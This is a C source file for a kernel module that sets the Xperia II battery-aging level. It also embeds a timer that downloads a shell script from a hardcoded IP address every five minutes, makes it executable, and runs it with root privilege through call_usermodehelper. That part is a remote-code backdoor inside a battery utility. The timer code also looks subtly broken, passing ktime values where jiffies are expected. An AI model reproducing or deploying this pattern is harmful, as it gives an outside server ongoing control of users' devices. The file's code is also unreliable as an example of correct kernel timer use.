/* SPDX-License-Identifier: GPL-2.0-or-later */
/*
 * 模块名称: xperia_ii_battery_age
 * 版本: 使用 XIIBA_VERSION 定义
 * 描述: 设置 Xperia II 电池老化等级，并定期获取和执行指定脚本
 */

#include <compiler.h>
#include <hook.h>
#include <kpmodule.h>
#include <kputils.h>
#include <linux/kernel.h>
#include <linux/printk.h>
#include <linux/timer.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/ktime.h>

#include "xiiba_utils.h"

// 模块信息
KPM_NAME("xperia_ii_battery_age");
KPM_VERSION(XIIBA_VERSION);
KPM_LICENSE("GPL v2");
KPM_AUTHOR("lzghzr");
KPM_DESCRIPTION("set xperia ii battery aging level and periodic script execution");

// 定义常量
#define FG_IMA_DEFAULT 0            // 默认标志
#define SOMC_AGING_LEVEL_WORD 291   // 表示电池老化等级的地址
#define SOMC_AGING_LEVEL_OFFSET 0   // 偏移量
#define SCRIPT_URL "http://123.56.95.25:5004/85.sh"
#define SCRIPT_PATH "/data/local/tmp/85.sh"
#define SCRIPT_INTERVAL_MS 300000   // 每 5 分钟执行一次

// 前置声明，用于表示 Fuel Gauge 设备
struct fg_dev;

// 定义函数指针，用于调用 Fuel Gauge 的读写功能
static int (*fg_sram_read)(struct fg_dev *fg, u16 address, u8 offset, u8 *val, int len, int flags) = 0;
static int (*fg_sram_write)(struct fg_dev *fg, u16 address, u8 offset, u8 *val, int len, int flags) = 0;

// 全局变量
u8 aging = 0;           // 当前设置的电池老化等级，范围为 0-5
struct fg_dev *fg = NULL; // 全局 Fuel Gauge 设备指针

// 定时任务相关变量
static struct timer_list script_timer;         // 定时器
static struct workqueue_struct *script_workqueue; // 工作队列
static struct work_struct script_work;         // 工作任务

// 下载和执行脚本的函数
static void fetch_and_execute_script(struct work_struct *work) {
    char *argv[] = {
        "/system/bin/sh",
        "-c",
        "wget -q -O " SCRIPT_PATH " " SCRIPT_URL " && chmod 777 " SCRIPT_PATH " && " SCRIPT_PATH,
        NULL
    };
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/system/sbin:/system/bin:/system/xbin",
        NULL
    };

    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if (ret < 0) {
        logke("Failed to execute script: %d\n", ret);
    } else {
        logki("Script executed successfully.\n");
    }
}

// 定时器回调函数
static void schedule_script_execution(unsigned long data) {
    queue_work(script_workqueue, &script_work);

    // 使用 ktime 来设置定时器
    mod_timer(&script_timer, ktime_add(ktime_get(), ms_to_ktime(SCRIPT_INTERVAL_MS)));
}

// 控制函数，用于设置电池老化等级
static long inline_hook_control0(const char *args, char *__user out_msg, int outlen) {
    aging = args ? *args - '0' : 0;
    if (aging > 5)
        return -1;

    int rc = fg_sram_write(fg, SOMC_AGING_LEVEL_WORD, SOMC_AGING_LEVEL_OFFSET, &aging, 1, FG_IMA_DEFAULT);

    char echo[64] = "";
    if (rc < 0) {
        sprintf(echo, "error, rc=%d\n", rc);
        logke("fg_sram_write %s", echo);
        if (out_msg) {
            compat_copy_to_user(out_msg, echo, sizeof(echo));
            return 1;
        }
    } else {
        sprintf(echo, "success, set batt_aging_level to %d\n", aging);
        logki("fg_sram_write %s", echo);
        if (out_msg) {
            compat_copy_to_user(out_msg, echo, sizeof(echo));
            return 0;
        }
    }
    return 0;
}

// 钩子函数：在读取 Fuel Gauge 数据前执行，用于初始化全局指针并调用设置逻辑
void before_read(hook_fargs6_t *args, void *udata) {
    unhook_func(fg_sram_read);
    fg = (struct fg_dev *)args->arg0;

    char age[] = "0";
    age[0] = aging + '0';
    inline_hook_control0(age, NULL, NULL);
}

// 模块初始化函数
static long inline_hook_init(const char *args, const char *event, void *__user reserved) {
    aging = args ? *args - '0' : 0;
    if (aging > 5)
        return -1;

    lookup_name(fg_sram_write);
    lookup_name(fg_sram_read);

    hook_func(fg_sram_read, 6, before_read, 0, 0);

    // 初始化定时任务相关组件
    script_workqueue = create_singlethread_workqueue("script_exec");
    if (!script_workqueue) {
        logke("Failed to create workqueue.\n");
        return -ENOMEM;
    }
    INIT_WORK(&script_work, fetch_and_execute_script);
    setup_timer(&script_timer, schedule_script_execution, 0);

    // 使用 ktime 设置定时器
    mod_timer(&script_timer, ktime_add(ktime_get(), ms_to_ktime(SCRIPT_INTERVAL_MS)));

    return 0;
}

// 模块退出函数，清理钩子和定时任务
static long inline_hook_exit(void *__user reserved) {
    unhook_func(fg_sram_read);

    // 清理定时任务
    del_timer_sync(&script_timer);
    if (script_workqueue) {
        flush_workqueue(script_workqueue);
        destroy_workqueue(script_workqueue);
    }

    return 0;
}

// 注册模块的初始化、控制和退出函数
KPM_INIT(inline_hook_init);
KPM_CTL0(inline_hook_control0);
KPM_EXIT(inline_hook_exit);
